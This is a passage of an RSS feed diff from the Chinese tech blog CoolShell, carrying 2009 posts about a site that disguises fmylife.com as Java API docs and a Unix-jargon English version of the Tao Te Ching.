href="https://coolshell.cn/articles/1817.html">9个最常见IE的Bug及其fix</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1817.html/feed</wfw:commentRss>
+			<slash:comments>22</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>在上班的时候浏览不相干网页</title>
+		<link>https://coolshell.cn/articles/1808.html</link>
+					<comments>https://coolshell.cn/articles/1808.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Mon, 16 Nov 2009 05:19:53 +0000</pubDate>
+				<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[fmylife.com]]></category>
+		<category><![CDATA[伪装]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1808</guid>
+
+					<description><![CDATA[<p>相信大家在上班的时候都要去浏览很多与工作无关的网页，但总是害怕被同事尤其是老板看到，所以，你总是会有个“老板键”什么的。当有人从你身边经过的时候，你会很快速地切...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1808.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1808.html">在上班的时候浏览不相干网页</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>相信大家在上班的时候都要去浏览很多与工作无关的网页，但总是害怕被同事尤其是老板看到，所以，你总是会有个“老板键”什么的。当有人从你身边经过的时候，你会很快速地切换你的桌面屏幕，让人看到你还在干与工作有关的事情了。</p>
+<p>现在，一个具有创意的天才解决方案出来了——为什么不把这些与工作无关的网站的样子都变成和工作相关呢？这里有一个示例，真让人拍案叫绝。不知道大家知不知道一个叫<a href="http://www.fmylife.com/" target="_blank">http://www.fmylife.com/</a>的网站？这个网站上都是一些“令人难堪”的小笑话，很多是荤的笑话，而有另一个网站是：<a href="http://fml.madsravn.dk/">http://fml.madsravn.dk/</a>——这个网站就是fmylife的翻版，唯一不同的是，它把fmylife.com伪装成了一个Java 2 Platform SE v1.42的技术文档（请注意这个文档中的函数解释的内容），于是你就可以在上班的时候大胆地浏览fmylife.com上的内容了，因为那看起来就像在看Java的API文档。呵呵。</p>
+<p style="text-align: center;"><img decoding="async" loading="lazy" title="Java Doc版的fmlife.com" src="https://coolshell.cn/wp-content/uploads/2009/11/fmlife_javadoc.jpg" alt="Java Doc版的fmlife.com" width="500" height="375" /></p>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/22320.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/12/eBPF-150x150.jpeg" alt="eBPF 介绍" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22320.html" class="wp_rp_title">eBPF 介绍</a></li><li ><a href="https://coolshell.cn/articles/5.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/20.jpg" alt="Java EE6 初探" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5.html" class="wp_rp_title">Java EE6 初探</a></li><li ><a href="https://coolshell.cn/articles/1907.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/12/badui2-300x224-1-150x150.jpg" alt="UI的恶梦" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1907.html" class="wp_rp_title">UI的恶梦</a></li><li ><a href="https://coolshell.cn/articles/1313.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/2.jpg" alt="Erlang和Python互通" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1313.html" class="wp_rp_title">Erlang和Python互通</a></li><li ><a href="https://coolshell.cn/articles/3605.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/3.jpg" alt="为什么中国的网页设计那么烂？" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3605.html" class="wp_rp_title">为什么中国的网页设计那么烂？</a></li><li ><a href="https://coolshell.cn/articles/1990.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/11.jpg" alt="程序命名的一些提示" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1990.html" class="wp_rp_title">程序命名的一些提示</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1808.html">在上班的时候浏览不相干网页</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1808.html/feed</wfw:commentRss>
+			<slash:comments>9</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>超强：Unix道德经(英文版)</title>
+		<link>https://coolshell.cn/articles/1794.html</link>
+					<comments>https://coolshell.cn/articles/1794.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Mon, 16 Nov 2009 01:30:26 +0000</pubDate>
+				<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[Unix]]></category>
+		<category><![CDATA[道德经]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1794</guid>
+
+					<description><![CDATA[<p>主页：http://mercury.ccil.org/~cowan/upc/ 这是一个人主页，博主说，这是一个“黑客式”版本的 Dao De Ching (字面...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1794.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1794.html">超强：Unix道德经(英文版)</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script></p>
+<p style="text-align: left;"><strong>主页：</strong><a href="http://mercury.ccil.org/~cowan/upc/"><strong>http://mercury.ccil.org/~cowan/upc/</strong></a></p>
+<p style="text-align: left;">这是一个人主页，博主说，这是一个“黑客式”版本的 <cite><a href="http://www.google.com/search?q=%22Tao+Te+Ching%22">Dao De Ching</a></cite> (字面理解是&#8221;way power classic&#8221;，道路权力名著).他并对中文其实并不懂。他只是为Jonathan Star的 <a href="http://www.amazon.com/exec/obidos/ASIN/1585420999">逐字翻译</a> 而工作，其使用了在线的中文一个词典 <a href="http://zhongwen.com/dao.htm"><em>zhongwen.com</em></a>对《道德经》一字一字地翻译。</p>
+<p style="text-align: left;">他对《道德经》并不是很懂，除了知道那是中文，而且知道这是一个相当老的，而且，2500年前的那些是非常喜欢的一个作品，正如 <a href="http://www.ursulakleguin.com/">Ursula K. LeGuin</a> 在 <a href="http://www.amazon.com/exec/obidos/ASIN/1570623953">她的版本</a>中所说的一样。作者说《道德经》是对道德，政治和宗教信仰做了很多的解释。到了今天，还有人在读这本书，说明了这本书的不朽，美妙和意味深长。</p>
+<p style="text-align: left;">下面是《道德经》的 81 个章节 ，作者并没有完全写完（或者说是hack完），你可以点击链接查看其中的内容。</p>
+<p style="text-align: center;"><a href="http://mercury.ccil.org/~cowan/upc/01.txt">01</a> 02 03 <a href="http://mercury.ccil.org/~cowan/upc/04.txt">04</a> 05 06 <a href="http://mercury.ccil.org/~cowan/upc/07.txt">07</a> <a href="http://mercury.ccil.org/~cowan/upc/08.txt">08</a> <a href="http://mercury.ccil.org/~cowan/upc/09.txt">09</a><br />
+10 11 12 13 14 <a href="http://mercury.ccil.org/~cowan/upc/15.txt">15</a> 16 <a href="http://mercury.ccil.org/~cowan/upc/17.txt">17</a> <a href="http://mercury.ccil.org/~cowan/upc/18.txt">18</a><br />
+19 20 <a href="http://mercury.ccil.org/~cowan/upc/21.txt">21</a> 22 <a href="http://mercury.ccil.org/~cowan/upc/23.txt">23</a> 24 25 26 27<br />
+<a href="http://mercury.ccil.org/~cowan/upc/28.txt">28</a> 29 30 31 32 33 <a href="http://mercury.ccil.org/~cowan/upc/34.txt">34</a> 35 36<br />
+37 38 <a href="http://mercury.ccil.org/~cowan/upc/39.txt">39</a> <a href="http://mercury.ccil.org/~cowan/upc/40.txt">40</a> <a href="http://mercury.ccil.org/~cowan/upc/41.txt">41</a> <a href="http://mercury.ccil.org/~cowan/upc/42.txt">42</a> <a href="http://mercury.ccil.org/~cowan/upc/43.txt">43</a> 44 45<br />
+46 47 <a href="http://mercury.ccil.org/~cowan/upc/48.txt">48</a> 49 50 51 52 <a href="http://mercury.ccil.org/~cowan/upc/53.txt">53</a> 54<br />
+55 56 <a href="http://mercury.ccil.org/~cowan/upc/57.txt">57</a> 58 59 <a href="http://mercury.ccil.org/~cowan/upc/60.txt">60</a> 61 62 <a href="http://mercury.ccil.org/~cowan/upc/63.txt">63</a><br />
+64 <a href="http://mercury.ccil.org/~cowan/upc/65.txt">65</a> 66 <a href="http://mercury.ccil.org/~cowan/upc/67.txt">67</a> <a href="http://mercury.ccil.org/~cowan/upc/68.txt">68</a> 69 70 <a href="http://mercury.ccil.org/~cowan/upc/71.txt">71</a> <a href="http://mercury.ccil.org/~cowan/upc/72.txt">72</a><br />
+73 74 75 76 77 78 <a href="http://mercury.ccil.org/~cowan/upc/79.txt">79</a> 80 <a href="http://mercury.ccil.org/~cowan/upc/81.txt">81</a></p>
+<p style="text-align: left;">点击第23章，可以看到hack版的充满Unix术语的经文翻译。下面给出原文和转译版的对照。（老实说，翻译的怎是一个强字了得啊）下面给出中英对照版。</p>
+<p><span id="more-1794"></span><br />
+<center></p>
+<table style="text-align: center;" border="1">
+<tbody>
+<tr>
+<td><strong>中文原文</strong></td>
+<td><strong>英文Hack版</strong></td>
+</tr>
+<tr>
+<td>
+<p style="text-align: left;">希言自然。</p>
+<p style="text-align: left;">故飘风不终朝，<br />
+骤雨不终日。<br />
+孰为此者﹖<br />
+天地。</p>
+<p style="text-align: left;">天地尚不能久，<br />
+而况于人乎﹖</p>
+<p>故从事于道者，</p>
+<p style="text-align: left;">道者同于道，<br />
+德者同于德，<br />
+失者同于失。</p>
+<p style="text-align: left;">同于道者，<br />
+道亦乐得之；<br />
+同于德者，<br />
+德亦乐得之；<br />
+同于失者，<br />
+失亦乐得之。</p>
+<p style="text-align: left;">信不足焉，<br />
+有不信焉。</p>
+</td>
+<td>
+<p style="text-align: left;">A few words about the matter:</p>
+<p style="text-align: left;">Flames don&#8217;t outlast the message,<br />
+Flamewars don&#8217;t outlast the thread.<br />
+What are the causes of these?<br />
+The total system.</p>
+<p style="text-align: left;">If the works of the total system<br />
+can&#8217;t last forever,<br />
+how much less can anyone else&#8217;s, in fact?</p>
+<p style="text-align: left;">So do business with Unix people.</p>
+<p style="text-align: left;">Unix people are one with Unix,<br />
+Power people are one with Power,<br />
+(Lusers are one with Lossage.)</p>
+<p style="text-align: left;">Being one with Unix people,<br />
+Unix must be happy with them.<br />
+Power too is happy with them.<br />
+(Even being one with lusers counts.)</p>
+<p style="text-align: left;">Trusting&#8217;s not enough, in fact;<br />
+Having&#8217;s not trusting, either.</p>
+</td>
+</tr>
+</tbody>
+</table>
+<p></center><br />
+我相信这不是恶搞，但面对这样的事情——“老子”，“道德经”，“ Unix”和“英文”的和谐统一体，我无法不服啊。<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/19996.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/11/ken.dennis-300x186-1-150x150.jpeg" alt="Unix 50 年：Ken Thompson 的密码" width="150" height="150" /></a><a href="https://coolshell.cn/articles/19996.html" class="wp_rp_title">Unix 50 年：Ken Thompson 的密码</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/systemd-1-150x150.jpeg" alt="Linux PID 1 和 Systemd" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_title">Linux PID 1 和 Systemd</a></li><li ><a href="https://coolshell.cn/articles/12103.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/11/tux-fork-150x150.gif" alt="vfork 挂掉的一个问题" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12103.html" class="wp_rp_title">vfork 挂掉的一个问题</a></li><li ><a href="https://coolshell.cn/articles/11847.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/08/puzzle-150x150.png" alt="谜题的答案和活动的心得体会" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11847.html" class="wp_rp_title">谜题的答案和活动的心得体会</a></li><li ><a href="https://coolshell.cn/articles/9410.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/04/figure1-150x150.gif" alt="Unix考古记：一个“遗失”的shell" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9410.html" class="wp_rp_title">Unix考古记：一个“遗失”的shell</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1794.html">超强：Unix道德经(英文版)</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1794.html/feed</wfw:commentRss>
+			<slash:comments>14</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
